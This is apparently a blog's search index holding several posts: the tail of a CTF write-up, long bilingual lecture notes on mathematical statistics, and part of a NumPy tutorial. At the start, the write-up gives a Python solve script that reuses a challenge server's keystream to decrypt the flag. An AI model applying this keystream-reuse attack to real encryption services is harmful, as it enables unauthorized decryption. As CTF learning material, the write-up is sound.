&quot;https://clandescriptorius.challs.pwnoh.io&quot;def hex2bytes(h): return binascii.unhexlify(h)def bytes2hex(b): return binascii.hexlify(b).decode()r = requests.post(f&quot;&#123;BASE&#125;/startsession&quot;, json=&#123;&quot;timestamp&quot;: -12&#125;)r.raise_for_status()j = r.json()sid = j[&quot;session_id&quot;]ct_flag = hex2bytes(j[&quot;encrypted_flag&quot;])blocks = [ct_flag[i:i+16] for i in range(0, len(ct_flag), 16)]n = len(blocks)js = [int(&quot;2&quot;+str(i)) for i in range(n)]max_j = max(js)total_blocks = max_j + 1pt = b&quot;\\x00&quot; * (16 * total_blocks)r2 = requests.post(f&quot;&#123;BASE&#125;/encrypt&quot;, json=&#123; &quot;session_id&quot;: sid, &quot;timestamp&quot;: -1, &quot;data&quot;: bytes2hex(pt)&#125;)r2.raise_for_status()ct = hex2bytes(r2.json()[&quot;encrypted&quot;])ks_blocks = [ct[16*j:16*(j+1)] for j in js]pt_blocks = [bytes(a ^ b for a,b in zip(blocks[i], ks_blocks[i])) for i in range(n)]pt_all = b&quot;&quot;.join(pt_blocks)pad = pt_all[-1]flag = pt_all[:-pad]print(&quot;Decrypted:&quot;, flag.decode(errors=&quot;replace&quot;))# Decrypted: bctf&#123;the_future_is_now_e3faa77c672e6d62&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"比赛Writeup","slug":"CTF/比赛Writeup","permalink":"https://archer-baiyi.github.io/en/categories/CTF/%E6%AF%94%E8%B5%9BWriteup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://archer-baiyi.github.io/en/tags/writeup/"}]},{"title":"统计 Statistics","slug":"TUM  数学 笔记/概率统计/Foundamentals-of-Mathematical-Statistics","date":"2025-10-25T14:44:16.000Z","updated":"2026-02-14T09:19:00.299Z","comments":true,"path":"2025/10/25/TUM  数学 笔记/概率统计/Foundamentals-of-Mathematical-Statistics/","permalink":"https://archer-baiyi.github.io/en/2025/10/25/TUM%20%20%E6%95%B0%E5%AD%A6%20%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87%E7%BB%9F%E8%AE%A1/Foundamentals-of-Mathematical-Statistics/","excerpt":"统计相关笔记","text":"IntroDefinition (mean（平均值）): The sample mean（平均值） of observed values $x_1,…,x_n \\in \\mathbb{R}$ is \\bar{x}_n = \\frac{1}{n}\\sum^n_{i=1}x_i. 用sample把它和概率论里的mean/expectation区分一下。 Definition (median（中位数）): The sample median（中位数） of observed values is x_{0.5} =\\begin{cases}x_{\\frac{n+1}{2}}, & \\text{if $n$ odd}, \\\\[1em]\\dfrac{1}{2}\\Bigl[x_{\\frac{n}{2}} + x_{\\frac{n}{2}+1}\\Bigr], & \\text{if $n$ even},\\end{cases}with $x_1 \\leq x_2 \\leq … \\leq x_n$ being the sorted data points. 如果总数为基数，就取最中间的那个数；如果总数是偶数，那就取中间2个的平均值。 Definition (Statistical model 统计模型): \\mathcal{P} = \\text{a set of probability distributions } P \\text{ on } (X,A). Definition (Parameter): A (statistical) parameter of a statistical model $\\mathcal{P}$ is a map $\\gamma : \\mathcal{P} \\to \\text{ some set }\\Tau$ . 例子： - 期望值 Mean/expectation \\gamma(P) = \\int x dP(x)- Variance \\gamma(P) = \\int x^2 dP(x) - (\\int x dP(x))^2- Correlations Construction of EstimatorsDefinition (Estimators): A estimator is a function that map data to estimates of quantities of interest. 简单来讲，estimator就是一个函数，它的定义域是数据，叫estimand，它的值域里的元素则是叫estimates。 Plug-in EstimatorDefinition (empirical distribution): The empirical distribution of $x_1, \\ldots, x_n \\in \\mathbb{R}$ is the probability distribution $\\hat{P}_n$ given by\\hat{P}_n(A) := \\frac{1}{n} \\#\\{ i : x_i \\in A \\}= \\frac{1}{n} \\sum_{i=1}^n \\mathbf{1}_{\\{ x_i \\in A \\}}, \\qquad A \\subseteq \\mathbb{R}. 一个相对离散的概率分布。 Definition (empirical distribution function (ecdf)): The empirical distribution function (ecdf) of $x_1, \\ldots, x_n$is the distribution function of $\\hat{P}_n$, which is\\hat{F}_n(t) := \\frac{1}{n} \\sum_{i=1}^n \\mathbf{1}_{\\{ x_i \\le t \\}},\\qquad t \\in \\mathbb{R}. 一个连续的分布函数。 Theorem (Glivenko—Cantelli): If $X_1, X_2, \\ldots$ are i.i.d. random variables with cdf (cumulative distribution function) $F$, then\\lVert \\hat{F}_n - F \\rVert_\\infty:= \\sup_{t \\in \\mathbb{R}} \\bigl| \\hat{F}_n(t; X_1, \\ldots, X_n) - F(t) \\bigr|\\xrightarrow{\\text{a.s.}} 0. 也就是说，当我们有足够多的样本时，这个esimator会趋近于它原本的分布。 Theorem: If $U \\sim Unif(0,1)$,then $X:=F^{-1}(U)$ has cdf $F$. Definition: The plug-in estimator of $\\gamma(F)$ is the estimator $\\hat{\\gamma} = \\gamma(\\hat{F_n})$. 例子： 考虑期望值 $\\gamma(F) = \\int x dF(x)$。那么有 \\gamma(\\hat{F_n}) = \\int x d\\hat{F_n}(x) = \\frac{1}{n} \\sum_{i=1}^n X_i = \\overline{X}_n 简单来讲，我们先观测已知参数时，怎么样可以从结果得到这个参数（把这个过程量化成函数$\\gamma$）。然后再把我们未知参数的观测结果带进这个函数$\\gamma$里来计算出参数。 以伯努利分布为例：样本 $X_i\\in\\{0,1\\}$，因为有$p=\\mathbb E[X]$，所以很自然的就得到 \\gamma(\\bar{X}) = p.M-EstimatorDefinition (M-estimator): An estimator $\\hat{\\theta}(X_1, \\ldots, X_n)$ maximizing a criterion function of the form\\theta \\;\\mapsto\\; \\frac{1}{n} \\sum_{i=1}^n m_\\theta(X_i),where $m_\\theta$ is a known function, is called an M-estimator (maximum-likelihood type).也就是说：\\hat{\\theta} = \\underset{\\theta}{\\text{arg max }} \\frac{1}{n} \\sum_{i=1}^n m_\\theta(X_i) 后面的MLE就是这个的一个特例。 例子： - $\\theta \\in \\mathbb{R}$, 如果选$m_\\theta(x) = -(x - \\theta)^2$，那么就会得到平均值 $\\bar{X}_n$。 - 选$m_\\theta(x) = -|x - \\theta|$，会得到中位数。 Method of Moments (MOM)Given a parametric model for real-valued observations X_1,...,X_n \\overset{i.i.d}{\\sim}P_\\theta, \\ \\ \\theta \\in \\Theta \\subseteq \\mathbb{R}^kconsider the moments \\mu_j(\\theta) = E_\\theta [X^j_i] \\text{ for } j=1,...,k.If it exists then the $j$-th moment may be estimated by \\hat{\\mu}_j = \\frac{1}{n}\\sum^n_{i=1}X^j_i.Definition: The MOM estimator $\\hat{\\theta}$ is the value of $\\theta$ that solves the equation system\\mu_j(\\theta) = \\hat{\\mu}_j, \\ \\ j =1,...,k. 也就是 E_\\theta [X^j_i] = \\frac{1}{n}\\sum^n_{i=1}X^j_i. 注意，参数$\\theta$是几维的我们就解几个方程。 例子（高斯）： Suppose $P_\\theta = \\mathcal{N}(\\mu, \\sigma^2)$ with mean and variance unknown.So, \\theta = (\\mu, \\sigma^2) \\in \\Theta = \\mathbb{R} \\times (0,\\infty).The density: p_\\theta(x) = \\frac{1}{\\sqrt{2\\pi\\sigma^2}} \\exp\\left\\{ -\\frac{1}{2\\sigma^2} (x - \\mu)^2 \\right\\}, \\qquad x \\in \\mathbb{R}.需要解的方程组： \\mu_1(\\theta) = \\mathbb{E}_\\theta[X_1] = \\mu \\;\\stackrel{!}{=}\\; \\overline{X}_n, \\mu_2(\\theta) = \\mathrm{Var}_\\theta[X_1] + \\big(\\mathbb{E}_\\theta[X_1]\\big)^2 = \\sigma^2 + \\mu^2 \\;\\stackrel{!}{=}\\; \\hat{\\mu}_2.最后得到sample mean以及empirical variance： \\hat{\\mu} = \\overline{X}_n, \\hat{\\sigma}^2 = \\hat{\\mu}_2 - (\\overline{X}_n)^2 = \\frac{1}{n} \\sum_{i=1}^n X_i^2 - \\left( \\frac{1}{n} \\sum_{i=1}^n X_i \\right)^2 = \\frac{1}{n} \\sum_{i=1}^n (X_i - \\overline{X}_n)^2.Maximum Likelihood Estimator (MLE)Consider a parametric model for the observation X \\sim P_\\theta, \\qquad \\theta \\in \\Theta \\subseteq \\mathbb{R}^k.Assume the model $\\mathcal{P} = \\{ P_\\theta : \\theta \\in \\Theta \\}$ is dominated by a $\\sigma$-finite measure $\\nu$, i.e., $P_\\theta \\ll \\nu$ for all $\\theta \\in \\Theta$, and so we have densities p_\\theta(x) = \\frac{\\mathrm{d} P_\\theta}{\\mathrm{d} \\nu}(x), \\qquad x \\in \\mathcal{X}.（这个so的结论是概率论里的结论。） Definition: The function $L_x(\\theta) = p_\\theta(x)$ is the likelihood function of model $\\mathcal{P}$ for the data $x$. 有密度函数直接套密度函数（density function）。 Definition: The maximum likelihood estimate (MLE) of $\\theta$ is\\hat{\\theta} = \\arg \\max_{\\theta \\in \\Theta} L_x(\\theta). If $\\hat{\\theta}(X)$ is a measurable function of the observation $X$, then $\\hat{\\theta}(X)$ is called maximum likelihood estimator (MLE) of $\\theta$. 只不过我们通常其实会考虑所谓的 log -likelihood function \\ell_x (\\theta) = \\text{log}L_x(\\theta).这样做有2点好处： 可以避免numerical overflow； 更方便计算。 如果$L_x$本身是$\\Pi$的形式，那$l_x$则会变成$\\sum$的形式。 变成$\\sum$后，求导的时候不相关的部分可以直接扔掉。 例子（高斯）： Suppose $X_1, \\ldots, X_n$ i.i.d. $\\mathcal{N}(\\mu, \\sigma^2)$, so $\\theta = (\\mu, \\sigma^2) \\in \\mathbb{R} \\times (0,\\infty)$. Assume $n \\ge 2$, so that $\\frac{1}{n} \\sum_{i=1}^n (X_i - \\overline{X}_n)^2 &gt; 0\\quad \\text{a.s.}$. The log -likelihood function： \\begin{align*} \\ell_X(\\theta) &= \\sum_{i=1}^n \\log \\left( \\frac{1}{\\sqrt{2\\pi \\sigma^2}} \\exp\\left\\{ -\\frac{1}{2\\sigma^2}(X_i - \\mu)^2 \\right\\} \\right) \\\\ &= -\\frac{n}{2}\\log(2\\pi) - \\frac{n}{2}\\log(\\sigma^2) - \\frac{1}{2\\sigma^2} \\sum_{i=1}^n (X_i - \\mu)^2. \\end{align*}不难得到： \\hat{\\mu} = \\arg\\min_{\\mu \\in \\mathbb{R}} \\sum_{i=1}^n (X_i - \\mu)^2 = \\overline{X}_n, \\hat{\\sigma}^2 = \\arg\\min_{\\sigma^2 > 0} \\left[ \\log(\\sigma^2) + \\frac{1}{\\sigma^2} \\cdot \\frac{1}{n} \\sum_{i=1}^n (X_i - \\overline{X}_n)^2 \\right] = \\frac{1}{n} \\sum_{i=1}^n (X_i - \\overline{X}_n)^2.贝叶斯估计（Bayes Estimators）在之前的构造里，所有参数都取决于我们拿到的数据，完全不受我们任何经验/前置知识的影响。 但我们现在希望修改这个模式：我们希望最后得到的参数同时取决于数据以及我们的经验/先前的判断。 贝叶斯推断（Bayesian Inference）的流程： 1. 把先前的常数值$\\theta$当作random variable（随机变量），并选择一个prior distribution（先验分布，即我们观察数据前的做出的判断）。 2. 把$P_\\theta$ 当作 the conditional distribution of $X$ given $\\theta$。 3. 在观察到了数据 $x$ 之后，做统计推断时，看 $\\theta$ 的后验分布（posterior distribution），也就是 “在观测到 $X = x$ 之后，$\\theta$ 的条件分布”。 Consider an observation modeled as $X\\sim P_\\theta, \\theta \\in \\Theta \\subseteq \\mathbb{R}.$ Theorem (Bayes theorem): Suppose the prior distribution has density $\\pi$ w.r.t. a measure $\\nu$ and$P_\\theta \\ll \\nu \\ \\ \\forall \\theta$ with densities $p_\\theta(x) = p(x \\mid \\theta)$.Then the posterior distribution has density (w.r.t. $\\nu$):p(\\theta \\mid x)= \\frac{p(x \\mid \\theta)\\,\\pi(\\theta)}{p(x)} ,wherep(x) = \\int_\\Theta p(x \\mid \\theta)\\,\\pi(\\theta)\\, \\mathrm{d}\\nu(\\theta)is the prior predictive density of $X$. Bayes estimators of $\\theta$ are obtained as characteristics of the posterior distribution.Most frequently, one considers the posterior mean: \\hat{\\theta} = \\mathbb{E}[\\theta \\mid X = x] = \\int \\theta \\cdot p(\\theta \\mid x) \\,\\mathrm{d}\\nu(\\theta).例子（高斯）： Assume $X_1, \\ldots, X_n$ i.i.d.\\ $\\mathcal{N}(\\mu, \\sigma^2)$ with $\\sigma^2 &gt; 0$ known. We select as prior distribution $\\mu \\sim \\mathcal{N}(m, \\tau^2)$ so \\pi(\\mu) = \\frac{1}{\\sqrt{2\\pi\\tau^2}} \\exp\\!\\left( -\\frac{1}{2\\tau^2}(\\mu - m)^2 \\right).The likelihood function is equal to L_X(\\mu) = \\prod_{i=1}^n \\frac{1}{\\sqrt{2\\pi\\sigma^2}} \\exp\\!\\left( -\\frac{1}{2\\sigma^2} (X_i - \\mu)^2 \\right).The posterior density is p(\\mu \\mid X) \\propto L_X(\\mu)\\,\\pi(\\mu) \\propto \\exp\\!\\left( -\\frac{1}{2\\sigma^2} \\sum_{i=1}^n (X_i - \\mu)^2 -\\frac{1}{2\\tau^2} (\\mu - m)^2 \\right) \\qquad \\text{(quadratic in $\\mu$)}.We recognize that the posterior distribution will be a normal distribution.More precisely, \\begin{align*} p(\\mu \\mid X) &\\propto \\exp\\!\\left\\{ -\\frac{1}{2\\sigma^2} \\Bigl( n\\cdot \\mu^2 - 2\\mu \\sum_{i=1}^n X_i \\Bigr) -\\frac{1}{2\\tau^2}(\\mu^2 - 2\\mu m) \\right\\}\\\\ &= \\exp\\!\\left\\{ \\Bigl( -\\frac{n}{2\\sigma^2} - \\frac{1}{2\\tau^2} \\Bigr)\\mu^2 -2\\mu \\Bigl( -\\frac{n\\overline{X}_n}{2\\sigma^2} - \\frac{m}{2\\tau^2} \\Bigr) \\right\\}\\\\ &= \\exp\\!\\left\\{ a \\mu^2 - 2 b \\mu \\right\\}, \\end{align*}where a = -\\frac{n}{2\\sigma^2} - \\frac{1}{2\\tau^2}, \\qquad b = \\frac{n\\overline{X}_n}{2\\sigma^2} - \\frac{m}{2\\tau^2}.We conclude that since $p(\\mu \\mid X) \\propto \\exp\\{ a \\cdot (\\mu - b/a)^2 \\}$,it holds that $p(\\mu \\mid X)$ is the density of a normal distribution with mean and variance: \\mathbb{E}[\\mu \\mid X] = \\frac{b}{a}, \\qquad \\mathrm{Var}[\\mu \\mid X] = -\\frac{1}{2a}.The posterior mean is a convex combination of $\\overline{X}_n$ and the prior mean $m$: \\begin{align*} \\mathbb{E}[\\mu \\mid X] = \\frac{b}{a} &= \\frac{\\frac{n\\overline{X}_n}{2\\sigma^2} - \\frac{m}{2\\tau^2}} {-\\frac{n}{2\\sigma^2} - \\frac{1}{2\\tau^2}}\\\\ &= \\overline{X}_n \\cdot \\frac{n/\\sigma^2}{n/\\sigma^2 + 1/\\tau^2} + m \\cdot \\frac{1/\\tau^2}{n/\\sigma^2 + 1/\\tau^2}\\\\ &= \\overline{X}_n \\cdot \\frac{\\tau^2}{\\tau^2 + \\sigma^2/n} + m \\cdot \\frac{\\sigma^2/n}{\\tau^2 + \\sigma^2/n}. \\end{align*}当我们设： \\lambda = \\frac{\\tau^2}{\\tau^2 + \\sigma^2/n}则有： \\mathbb{E}[\\mu \\mid X] = \\lambda \\cdot\\overline{X}_n + (1-\\lambda)m.注意到当n趋近于无穷时，$\\lambda$会趋近于1。也就是说，当n越大，最后算出来的mean就会越取决于我们拿到的数据。反之，n越小，则会更取决于我们的先验知识。 Mean Square Error, Bias and VarianceDefinition: The mean square error is defined as\\mathrm{MSE}_\\theta[\\hat{\\theta}]:= \\mathbb{E}_\\theta \\big[ (\\hat{\\theta} - \\theta)^2 \\big]= \\int_{\\mathcal{X}} (\\hat{\\theta}(x) - \\theta)^2 \\, \\mathrm{d}P_\\theta(x). Theorem: The mean square error decomposes as\\mathrm{MSE}_\\theta[\\hat{\\theta}]= \\big( \\mathrm{Bias}_\\theta[\\hat{\\theta}] \\big)^2+ \\mathrm{Var}_\\theta[\\hat{\\theta}],where $\\mathrm{Bias}_\\theta[\\hat{\\theta}]:= \\mathbb{E}_\\theta[\\hat{\\theta}] -\\theta$ is the bias of $\\hat{\\theta}.$ Proof: Write $\\mathrm{MSE}_\\theta[\\hat{\\theta}]= \\mathbb{E}_\\theta\\Big[\\big(\\hat{\\theta} - \\mathbb{E}_\\theta[\\hat{\\theta}] + \\mathbb{E}_\\theta[\\hat{\\theta}] - \\theta \\big)^2 \\Big] $ and expand \\begin{align*} \\mathrm{MSE}_\\theta[\\hat{\\theta}] &= \\mathbb{E}_\\theta \\Big[ \\big(\\hat{\\theta} - \\mathbb{E}_\\theta[\\hat{\\theta}]\\big)^2 \\Big] + \\mathbb{E}_\\theta \\Big[ \\big(\\mathbb{E}_\\theta[\\hat{\\theta}] - \\theta\\big)^2 \\Big] + 2 \\, \\mathbb{E}_\\theta \\Big[ \\big(\\hat{\\theta} - \\mathbb{E}_\\theta[\\hat{\\theta}]\\big) \\big(\\mathbb{E}_\\theta[\\hat{\\theta}] - \\theta\\big) \\Big].\\\\ &= \\mathrm{Var}_\\theta[\\hat{\\theta}] + \\big(\\mathrm{Bias}_\\theta[\\hat{\\theta}]\\big)^2 + 2 \\cdot \\mathrm{Bias}_\\theta[\\hat{\\theta}] \\cdot \\underbrace{ \\mathbb{E}_\\theta \\big[ \\hat{\\theta} - \\mathbb{E}_\\theta[\\hat{\\theta}] \\big] }_{=0}\\\\ &= \\mathrm{Var}_\\theta[\\hat{\\theta}] + \\big(\\mathrm{Bias}_\\theta[\\hat{\\theta}]\\big)^2. \\end{align*}$\\square$ Sufficient StatisticsDefinition: The statistic $T$ is sufficient for model $\\mathcal{P}=\\{P_\\theta:\\theta\\in\\Theta\\}$ if there exists a determination of the conditional distribution of $X$ given $T(X)=t$ that does not depend on $\\theta$. Theorem (Neyman’s Factorization Criterion): Let $\\mathcal{P}=\\{P_\\theta:\\theta\\in\\Theta\\}$ be dominated by a $\\sigma$-finite measure $\\nu$, i.e., each $P_\\theta$ has a densityp_\\theta(x)=\\frac{dP_\\theta}{d\\nu}(x),\\qquad \\theta\\in\\Theta.Then a statistic $T:\\mathcal{X}\\to\\mathcal{Y}$ is sufficient for $\\mathcal{P}$ if and only if there exist measurable non-negative functions $h$ and $g_\\theta$ such that for all $\\theta\\in\\Theta$ the density of $P_\\theta$ may be given the formp_\\theta(x)=g_\\theta(T(x))\\,h(x),\\qquad x\\in\\mathcal{X}. \\tag{3.1} 所以可以很简单地通过分解density函数来得到一个sufficient的statistic。 Definition: A sufficient statistic $T$ is minimal sufficient if $T$ is a function of every other sufficient statistic $T’$, or more precisely if\\exists\\ \\text{measurable map } S \\text{ s.t. } T(x)=S(T'(x)) \\text{ for almost every } x\\in\\mathcal{X}.‘Almost every’ means that $T(x)=S(T’(x))$ for $x$ in a set $\\mathcal{X}^\\subseteq\\mathcal{X}$ with $P_\\theta(\\mathcal{X}^)=1$ for all $\\theta\\in\\Theta$. The existence of such a map $S$ is equivalent toT'(x)=T'(\\tilde{x})\\ \\Longrightarrow\\ T(x)=T(\\tilde{x}) \\qquad \\forall x,\\tilde{x}\\in\\mathcal{X}^*. \\tag{3.2} Theorem: Let $\\mathcal{P}=\\{P_\\theta:\\theta\\in\\Theta\\}$ be dominated by a $\\sigma$-finite measure $\\nu$ with densitiesp_\\theta(x)=\\frac{dP_\\theta}{d\\nu}(x).Define the support $\\operatorname{supp}(\\mathcal{P})=\\{x:\\exists\\,\\theta\\text{ with }p_\\theta(x)&gt;0\\}$.Let $T$ be a statistic such that for all $x,\\tilde{x}\\in\\operatorname{supp}(\\mathcal{P})$ it holds thatT(x)=T(\\tilde{x})\\ \\Longleftrightarrow\\ \\exists\\,c(x,\\tilde{x})>0\\ \\forall \\theta\\in\\Theta:\\ p_\\theta(x)=p_\\theta(\\tilde{x})\\cdot c(x,\\tilde{x}). \\tag{3.3}Then $T$ is minimal sufficient. CompletenessTheorem (Basu&#39;s Theorem): Let $X$ be an observation from the statistical model $\\mathcal{P} = \\{ P_{\\theta}: \\theta \\in \\Theta \\}$ and $T$ a complete and sufficient statistic for $\\theta$. If $A$ is an ancillary statistic, i.e. the distribution of $A(X)$ does not depend on $\\theta$, then $A(X)$ is independent of $T(X)$. Proof: Since $A$ is ancillary, the probability P_\\theta(A(X)\\in B)=P_\\theta\\bigl(X\\in A^{-1}(B)\\bigr)=c_Bwill be constant with respect to $\\theta$ for all $B$ in the range of $A$.Since $T$ is sufficient, $E_\\theta\\left[\\mathbf{1}_{\\{A(X)\\in B\\}}\\mid T\\right]$ is a function of $T$ (independent of $\\theta$). Then E_\\theta\\left[P_\\theta\\bigl(X\\in A^{-1}(B)\\bigr)\\right] = P_\\theta\\bigl(X\\in A^{-1}(B)\\bigr) = E_\\theta\\left[\\mathbf{1}_{\\{A(X)\\in B\\}}\\right] = E_\\theta\\left[E_\\theta\\left[\\mathbf{1}_{\\{A(X)\\in B\\}}\\mid T\\right]\\right], \\qquad \\forall \\theta\\in\\Theta.Hence, E_\\theta[h(T)] = 0,\\qquad \\forall \\theta\\in\\Theta.with $h(T)=P\\bigl(X\\in A^{-1}(B)\\bigr)-E\\left[\\mathbf{1}_{\\{A(X)\\in B\\}}\\mid T\\right].$ But since $T$ is complete, this implies 0=h(T)=P_*\\bigl(X\\in A^{-1}(B)\\bigr)-E_*\\left[\\mathbf{1}_{\\{A(X)\\in B\\}}\\mid T\\right] \\qquad [P\\text{-a.e.}],with $P_{\\ast}$ and $E_{\\ast}$ denoting to be independent of $\\theta$. Let sets $B$ and $C$ be arbitrary sets from the range of $A$ and $T$, respectively.Then, we have: \\begin{aligned} P_\\theta(A(X)\\in B,\\;T(X)\\in C) &=E_\\theta\\left[\\mathbf{1}_{\\{A(X)\\in B\\}}\\cdot \\mathbf{1}_{\\{T(X)\\in C\\}}\\right] \\\\ &=E_\\theta\\left[E_\\theta\\!\\left[\\mathbf{1}_{\\{A(X)\\in B\\}}\\cdot \\mathbf{1}_{\\{T(X)\\in C\\}}\\mid T(X)\\right]\\right] \\\\ &=E_\\theta\\left[\\mathbf{1}_{\\{T(X)\\in C\\}}\\cdot E_*\\!\\left[\\mathbf{1}_{\\{A(X)\\in B\\}}\\mid T(X)\\right]\\right] \\\\ &=E_\\theta\\left[\\mathbf{1}_{\\{T(X)\\in C\\}}\\cdot P_\\theta\\!\\bigl(X\\in A^{-1}(B)\\bigr)\\right] \\\\ &=P_\\theta\\bigl(X\\in A^{-1}(B)\\bigr)\\cdot E_\\theta\\!\\left[\\mathbf{1}_{\\{T(X)\\in C\\}}\\right] \\\\ &=P_\\theta(A(X)\\in B)\\cdot P_\\theta(T(X)\\in C), \\end{aligned}for all $\\theta\\in\\Theta$, which means $A$ and $T$ are independent. Exponential FamiliesDefinition: Let $\\mathcal{P}=\\{P_\\theta:\\theta\\in\\Theta\\}$ be a statistical model on $(\\mathcal{X},\\mathcal{A})$ that is dominated by a $\\sigma$-finite measure $\\nu$. Suppose there are functionsB:\\Theta\\to\\mathbb{R},\\qquad \\eta:\\Theta\\to\\mathbb{R}^k,T:\\mathcal{X}\\to\\mathbb{R}^k,\\qquad h:\\mathcal{X}\\to[0,\\infty)such that the densities $p_\\theta(x)=\\frac{dP_\\theta}{d\\nu}(x)$ are of the formp_\\theta(x)=\\exp\\left\\{\\sum_{i=1}^k \\eta_i(\\theta)T_i(x)-B(\\theta)\\right\\}h(x),\\qquad x\\in\\mathcal{X}. \\tag{4.1}=\\exp\\left\\{\\langle \\eta(\\theta),T(x)\\rangle - B(\\theta)\\right\\}h(x).Then $\\mathcal{P}$ is called a $k$-dimensional exponential family with natural parameters $\\eta(\\theta)$ and sufficient statistic $T$ (recall Neyman’s criterion). Corollary: If $\\eta(\\Theta)=\\{\\eta(\\theta):\\theta\\in\\Theta\\}\\subseteq\\mathbb{R}^k$ contains $k+1$ points $\\eta^{(0)},\\ldots,\\eta^{(k)}$ s.t. $\\eta^{(j)}-\\eta^{(0)}$, $j=1,\\ldots,k$ are linearly independent, then the sufficient statistic $T$ is minimal sufficient. By re-parametrizing in terms of natural parameters, we may bring an exponential family into its canonical formp_\\eta(x)=\\exp\\{\\langle \\eta, T(x)\\rangle - A(\\eta)\\}h(x),\\qquad x\\in\\mathcal{X}.We write $P_\\eta$ for the distribution given by the density $p_\\eta$.The density $p_\\eta(x)$ is well-defined for every vector $\\eta$ in the natural parameter space\\mathcal{H}=\\left\\{\\eta\\in\\mathbb{R}^k:\\int_{\\mathcal{X}}\\exp\\{\\langle \\eta,T(x)\\rangle\\}h(x)\\,d\\nu(x)","categories":[{"name":"TUM 数学 笔记","slug":"TUM-数学-笔记","permalink":"https://archer-baiyi.github.io/en/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/"},{"name":"概率/统计 Probability & Statistics","slug":"TUM-数学-笔记/概率-统计-Probability-Statistics","permalink":"https://archer-baiyi.github.io/en/categories/TUM-%E6%95%B0%E5%AD%A6-%E7%AC%94%E8%AE%B0/%E6%A6%82%E7%8E%87-%E7%BB%9F%E8%AE%A1-Probability-Statistics/"}],"tags":[{"name":"统计","slug":"统计","permalink":"https://archer-baiyi.github.io/en/tags/%E7%BB%9F%E8%AE%A1/"},{"name":"Statistics","slug":"Statistics","permalink":"https://archer-baiyi.github.io/en/tags/Statistics/"}]},{"title":"Python的Numpy库","slug":"编程/Python的Numpy库","date":"2025-10-23T22:01:05.000Z","updated":"2026-02-23T08:54:39.536Z","comments":true,"path":"2025/10/24/编程/Python的Numpy库/","permalink":"https://archer-baiyi.github.io/en/2025/10/24/%E7%BC%96%E7%A8%8B/Python%E7%9A%84Numpy%E5%BA%93/","excerpt":"Python的Numpy库常用函数","text":"官方快速入门教程：https://numpy.org/doc/stable/user/quickstart.html Basics安装： 1pip install numpy 导入： 1import numpy as np NumPy 的核心对象是 同质（同 dtype）的多维数组 ndarray，维度在 NumPy 里叫 axes（轴）。常用属性： ndim：维度数 shape：每个维度的长度（元组） size：元素总数 dtype：元素类型 itemsize：每个元素占用字节数 例子： 12345678a = np.arange(15).reshape(3, 5)print(a)print(&quot;shape:&quot;, a.shape)print(&quot;ndim:&quot;, a.ndim)print(&quot;dtype:&quot;, a.dtype)print(&quot;itemsize:&quot;, a.itemsize)print(&quot;size:&quot;, a.size)print(type(a)) 123456789[[ 0 1 2 3 4] [ 5 6 7 8 9] [10 11 12 13 14]]shape: (3, 5)ndim: 2dtype: int64itemsize: 8size: 15&lt;class &#x27;numpy.ndarray&#x27;&gt; arange 生成序列，reshape 改形状。 创建数组从 Python 列表/元组创建123456a = np.array([2, 3, 4])b = np.array([(1.5, 2, 3), (4, 5, 6)])c = np.array([[1, 2], [3, 4]], dtype=complex)print(a, a.dtype)print(b, b.dtype)print(c, c.dtype) 1234567[2 3 4] int64[[1.5 2. 3. ] [4. 5. 6. ]] float64 [[1.+0.j 2.+0.j] [3.+0.j 4.+0.j]] complex128 生成占位数组123456z = np.zeros((3, 4))o = np.ones((2, 3, 4), dtype=np.int16)e = np.empty((2, 3))print(z)print(o.dtype, o.shape)print(e) # empty 里的初值不保证是什么 12345678[[0. 0. 0. 0.] [0. 0. 0. 0.] [0. 0. 0. 0.]] int16 (2, 3, 4)[[0. 0. 0.] [0. 0. 0.]] 生成等差/等分序列1234print(np.arange(10, 30, 5))print(np.arange(0, 2, 0.3)) # 浮点步长可能会有精度问题print(np.linspace(0, 2, 9)) # 更可控：指定要几个点 打印数组大数组会自动省略中间： 12print(np.arange(10000))print(np.arange(10000).reshape(100, 100)) 12345678[ 0 1 2 ... 9997 9998 9999][[ 0 1 2 ... 97 98 99] [ 100 101 102 ... 197 198 199] [ 200 201 202 ... 297 298 299] ... [9700 9701 9702 ... 9797 9798 9799] [9800 9801 9802 ... 9897 9898 9899] [9900 9901 9902 ... 9997 9998 9999]] 想强制全打印可以用 np.set_printoptions(...)。 基本运算逐元素四则运算1234a = np.array([20, 30, 40, 50])b = np.arange(4)print(a - b) # 逐元素print(b**2) # 逐元素幂 12[20 29 38 47][0 1 4 9] NumPy数组上的算术运算默认是逐元素，并且通常会生成一个新数组。 矩阵乘法@： 12345A = np.array([[1, 1], [0, 1]])B = np.array([[2, 0], [3, 4]])print(A @ B) 12[[5 4] [3 4]] 常见聚合1234m = np.arange(12).reshape(3, 4)print(&quot;sum:&quot;, m.sum())print(&quot;sum axis=0 (按列):&quot;, m.sum(axis=0))print(&quot;sum axis=1 (按行):&quot;, m.sum(axis=1)) 123sum: 66sum axis=0 (按列): [12 15 18 21]sum axis=1 (按行): [ 6 22 38] 通用函数对数组整体无for循环的计算： 1234x = np.linspace(0, 2*np.pi, 5)print(np.sin(x))print(np.exp(x))print(np.sqrt(x)) 会自动对数组逐元素计算。 索引、切片、迭代切片12a = np.arange(10)print(a[2:7:2]) # [start:stop:step] 多维索引与切片1234b = np.arange(12).reshape(3, 4)print(b[1, 2]) # 第1行第2列print(b[:, 1]) # 所有行的第1列print(b[0:2, 1:3]) # 子矩阵 遍历：flat 按元素展开迭代12for element in b.flat: pass 形状操作（Shape manipulation）最常用的： reshape：改形状（不一定复制数据） ravel：展平（通常返回视图） T / transpose：转置/换轴 123456a = np.arange(12)b = a.reshape(3, 4)print(b)print(b.ravel()) # 展平print(b.T) # 转置 拼接与拆分（stacking / splitting）12345678910a = np.arange(6).reshape(2, 3)b = np.arange(6, 12).reshape(2, 3)print(np.vstack([a, b])) # 竖向拼（行增加）print(np.hstack([a, b])) # 横向拼（列增加）m = np.arange(12).reshape(3, 4)left, right = np.hsplit(m, 2)print(left)print(right) 视图与拷贝（Copies and views）1234a = np.arange(10)b = a[2:7]b[:] = 99print(a) # a 也会被影响 b = a[2:7]得到的是 view（视图）： a 和 b 是 两个不同的 ndarray 对象（id(a) 和 id(b) 不同） 但它们 共享同一块底层数据缓冲区（同一个指针，同一片内存里的数据） 1234a = np.arange(10)b = a[2:7].copy()b[:] 